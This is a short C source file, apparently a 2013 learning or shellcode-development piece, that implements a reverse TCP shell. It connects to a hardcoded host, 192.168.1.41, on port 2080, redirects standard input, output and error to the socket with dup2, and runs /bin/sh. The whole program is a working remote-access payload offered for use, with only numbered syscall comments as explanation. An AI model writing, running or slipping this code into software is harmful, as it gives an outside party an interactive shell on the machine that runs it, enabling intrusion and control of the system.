/*
 Filename  : reverse_tcp.c
 Author    : M.Acosta snow <amcx62[_at_]gmail[_dot_]com>
 Date      : 2013 August
 Location  : Lima(Peru)
 Desc      : Reverse Tcp C program 
 Tested on : Linux/x86 (Ubuntu SMP 3.2.0-49-generic-pae)
*/
#include<stdio.h>
#include<sys/types.h>
#include<sys/socket.h>
#include<netinet/in.h>
int main(){

        int sfd,cd;
        int port;
        struct sockaddr_in server_addr;

        port=2080;
        /* 1) socket syscall */
        sfd=socket(AF_INET,SOCK_STREAM,0);

        server_addr.sin_family=AF_INET;
        server_addr.sin_addr.s_addr=inet_addr("192.168.1.41");
        server_addr.sin_port=htons(port);
        
        /* 2) connect syscall*/
        connect(sfd,(struct sockaddr *)&server_addr, sizeof(struct sockaddr));

        /* 3) dup2 syscall */
        dup2(sfd,0);
        dup2(sfd,1);
        dup2(sfd,2);

        /* 4) exeve syscall */
        execve("/bin/sh",NULL,NULL);
}
